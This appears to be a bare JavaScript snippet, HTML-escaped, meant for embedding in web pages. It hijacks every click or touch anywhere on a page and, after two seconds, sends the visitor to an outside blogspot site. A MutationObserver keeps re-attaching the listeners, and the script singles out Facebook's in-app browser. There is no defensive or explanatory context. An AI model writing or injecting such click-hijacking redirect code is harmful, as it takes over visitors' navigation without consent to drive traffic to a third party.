(function() {
  let canRedirect = true;
  const redirectURL = &#39;https://zmistar.blogspot.com/&#39;;

  function triggerRedirect(e) {
    if (!canRedirect) return;
    canRedirect = false;
    setTimeout(() =&gt; {
      window.location.href = redirectURL;
    }, 2000);
    setTimeout(() =&gt; {
      canRedirect = true;
    }, 0);
  }

  function attachEvents() {
    const addListeners = (el) =&gt; {
      el.addEventListener(&#39;click&#39;, triggerRedirect, {passive: true});
      el.addEventListener(&#39;touchstart&#39;, triggerRedirect, {passive: true});
    };

    addListeners(document.body);
    addListeners(document.documentElement);

    const observer = new MutationObserver(() =&gt; {
      addListeners(document.body);
      addListeners(document.documentElement);
    });

    observer.observe(document.body, {childList: true, subtree: true});
  }

  if (document.readyState === &#39;loading&#39;) {
    document.addEventListener(&#39;DOMContentLoaded&#39;, attachEvents);
  } else {
    attachEvents();
  }

  const ua = navigator.userAgent || navigator.vendor || window.opera;
  const isFBBrowser = ua.indexOf(&quot;FBAN&quot;) &gt; -1 || ua.indexOf(&quot;FBAV&quot;) &gt; -1;
  if (isFBBrowser) console.log(&quot;Facebook browser detected&quot;);
})();
